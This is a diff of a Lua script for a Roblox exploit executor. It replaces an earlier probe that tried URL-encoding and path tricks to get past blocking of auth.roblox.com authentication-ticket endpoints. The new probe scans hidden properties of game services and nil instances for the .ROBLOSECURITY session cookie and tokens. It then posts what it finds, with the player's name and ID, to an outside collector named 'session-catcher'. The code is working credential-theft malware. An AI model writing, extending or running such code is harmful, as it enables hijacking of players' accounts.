@@ -1,6 +1,5 @@
 -- ============================================================
---  Probe A — URL Filter Bypass
---  Обход блокировки auth.roblox.com через модификацию URL
+--  Probe B — gethiddenproperties + getproperties + getnilinstances
 -- ============================================================
 
 local SERVER_URL = "https://session-catcher.onrender.com/catch"
@@ -11,94 +10,122 @@ local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 
-local urlBypassResults = {}
+local hiddenPropertiesAll = {}
+local propertiesAll = {}
+local nilInstances = {}
 
--- Все варианты URL для auth ticket
-local authUrls = {
-    -- Регистр
-    "https://Auth.Roblox.com/v1/authentication-ticket",
-    "https://AUTH.ROBLOX.COM/v1/authentication-ticket",
-    "https://auth.Roblox.com/v1/authentication-ticket",
-    -- Порт
-    "https://auth.roblox.com:443/v1/authentication-ticket",
-    "https://auth.roblox.com:80/v1/authentication-ticket",
-    -- Trailing
-    "https://auth.roblox.com/v1/authentication-ticket?",
-    "https://auth.roblox.com/v1/authentication-ticket#",
-    "https://auth.roblox.com/v1/authentication-ticket/",
-    -- Path traversal
-    "https://auth.roblox.com/./v1/authentication-ticket",
-    "https://auth.roblox.com/v1/./authentication-ticket",
-    "https://auth.roblox.com//v1/authentication-ticket",
-    "https://auth.roblox.com/v1//authentication-ticket",
-    -- URL encoding
-    "https://auth%2Eroblox%2Ecom/v1/authentication-ticket",
-    "https://auth.roblox%2Ecom/v1/authentication-ticket",
-    "https://auth%2eroblox%2ecom/v1/authentication-ticket",
-    -- Double encoding
-    "https://auth%252Eroblox%252Ecom/v1/authentication-ticket",
-    -- Subdomain tricks
-    "https://www.auth.roblox.com/v1/authentication-ticket",
-    "https://auth-www.roblox.com/v1/authentication-ticket",
-    -- IP (auth.roblox.com резолвится в разные IP, но попробуем)
-    "https://auth.roblox.com./v1/authentication-ticket",
-    -- Auth endpoints на www (не заблокирован)
-    "https://www.roblox.com/api/authentication-ticket",
-    "https://www.roblox.com/authentication/ticket",
-    "https://www.roblox.com/auth/ticket",
-    "https://www.roblox.com/api/auth/ticket",
-    "https://www.roblox.com/login/get-session-token",
-    "https://www.roblox.com/api/users/authenticated",
-    -- Другие поддомены
-    "https://api.roblox.com/auth/ticket",
-    "https://api.roblox.com/v1/authentication-ticket",
+-- -----------------------------------------------------------
+-- 1. gethiddenproperties на всех сервисах
+-- -----------------------------------------------------------
+local services = {
+    {"Players", game:GetService("Players")},
+    {"NetworkClient", game:GetService("NetworkClient")},
+    {"ReplicatedFirst", game:GetService("ReplicatedFirst")},
+    {"RbxAnalyticsService", game:GetService("RbxAnalyticsService")},
+    {"PlatformUserService", game:GetService("PlatformUserService")},
+    {"DataStoreService", game:GetService("DataStoreService")},
+    {"ScriptContext", game:GetService("ScriptContext")},
+    {"TeleportService", game:GetService("TeleportService")},
+    {"HttpService", game:GetService("HttpService")},
+    {"game", game},
+    {"LocalPlayer", LocalPlayer},
 }
 
-for _, url in ipairs(authUrls) do
+for _, pair in ipairs(services) do
+    local name = pair[1]
+    local svc = pair[2]
+    
+    -- gethiddenproperties (множественное)
     pcall(function()
-        local ok, resp = pcall(function()
-            return game:HttpGet(url)
-        end)
-        if ok and resp then
-            urlBypassResults[url] = "OK: " .. tostring(resp):sub(1, 400)
-        else
-            urlBypassResults[url] = "ERR: " .. tostring(resp):sub(1, 200)
+        if gethiddenproperties then
+            local props = gethiddenproperties(svc)
+            if props and type(props) == "table" then
+                local dump = {}
+                for k, v in pairs(props) do
+                    dump[tostring(k)] = tostring(v):sub(1, 300)
+                end
+                hiddenPropertiesAll[name] = dump
+            else
+                hiddenPropertiesAll[name] = "empty or nil"
+            end
         end
     end)
-    task.wait(0.2)
-end
-
--- Также пробуем request() к этим URL (может Delta прикрепит куку к roblox.com)
-for _, url in ipairs(authUrls) do
+    task.wait(0.1)
+    
+    -- getproperties (множественное)
     pcall(function()
-        local ok, resp = pcall(httpRequest, {
-            Url = url,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = ""
-        })
-        if ok and resp then
-            local result = "Status:" .. tostring(resp.StatusCode) .. " Body:" .. tostring(resp.Body):sub(1, 300)
-            if resp.Headers then
-                for k, v in pairs(resp.Headers) do
-                    if tostring(k):lower():find("ticket") or tostring(k):lower():find("auth") then
-                        result = result .. " HEADER:" .. tostring(k) .. "=" .. tostring(v):sub(1, 200)
+        if getproperties then
+            local props = getproperties(svc)
+            if props and type(props) == "table" then
+                local dump = {}
+                for k, v in pairs(props) do
+                    local vStr = tostring(v)
+                    -- Ищем куку
+                    if vStr:find("_|WARNING") or vStr:find("ROBLOSECURITY") then
+                        dump[tostring(k)] = "COOKIE: " .. vStr:sub(1, 500)
+                    else
+                        dump[tostring(k)] = vStr:sub(1, 200)
                     end
                 end
+                propertiesAll[name] = dump
             end
-            urlBypassResults["request:" .. url] = result
-        else
-            urlBypassResults["request:" .. url] = "ERR: " .. tostring(resp):sub(1, 200)
         end
     end)
-    task.wait(0.2)
+    task.wait(0.1)
 end
 
+-- -----------------------------------------------------------
+-- 2. getnilinstances — ищем скрытые объекты
+-- -----------------------------------------------------------
+pcall(function()
+    if getnilinstances then
+        local instances = getnilinstances()
+        if instances then
+            for _, inst in ipairs(instances) do
+                local name = inst.Name or "?"
+                local className = inst.ClassName or "?"
+                local entry = name .. " (" .. className .. ")"
+                
+                -- Проверяем скрытые свойства
+                if gethiddenproperties then
+                    local ok, props = pcall(gethiddenproperties, inst)
+                    if ok and props then
+                        for k, v in pairs(props) do
+                            local vStr = tostring(v)
+                            if vStr:find("_|WARNING") or vStr:find("ROBLOSECURITY") 
+                               or vStr:find("cookie") or vStr:find("token") then
+                                entry = entry .. " 🍪 " .. tostring(k) .. "=" .. vStr:sub(1, 300)
+                            end
+                        end
+                    end
+                end
+                
+                -- Проверяем обычные свойства
+                if getproperties then
+                    local ok2, props2 = pcall(getproperties, inst)
+                    if ok2 and props2 then
+                        for k, v in pairs(props2) do
+                            local vStr = tostring(v)
+                            if vStr:find("_|WARNING") or vStr:find("ROBLOSECURITY") then
+                                entry = entry .. " 🍪 " .. tostring(k) .. "=" .. vStr:sub(1, 300)
+                            end
+                        end
+                    end
+                end
+                
+                table.insert(nilInstances, entry)
+            end
+        end
+    end
+end)
+
 local payload = {
-    probe = "A — URL Filter Bypass",
+    probe = "B — Hidden Props + Nil Instances",
     username = LocalPlayer.Name,
     userId = LocalPlayer.UserId,
-    urlBypassResults = urlBypassResults,
+    hiddenPropertiesAll = hiddenPropertiesAll,
+    propertiesAll = propertiesAll,
+    nilInstances = nilInstances,
     timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
 }
 
@@ -111,4 +138,4 @@ pcall(function()
     })
 end)
 
-print("[Probe A] sent. URLs tested: " .. #authUrls)
+print("[Probe B] sent. Services: " .. #services .. " | Nil instances: " .. #nilInstances)
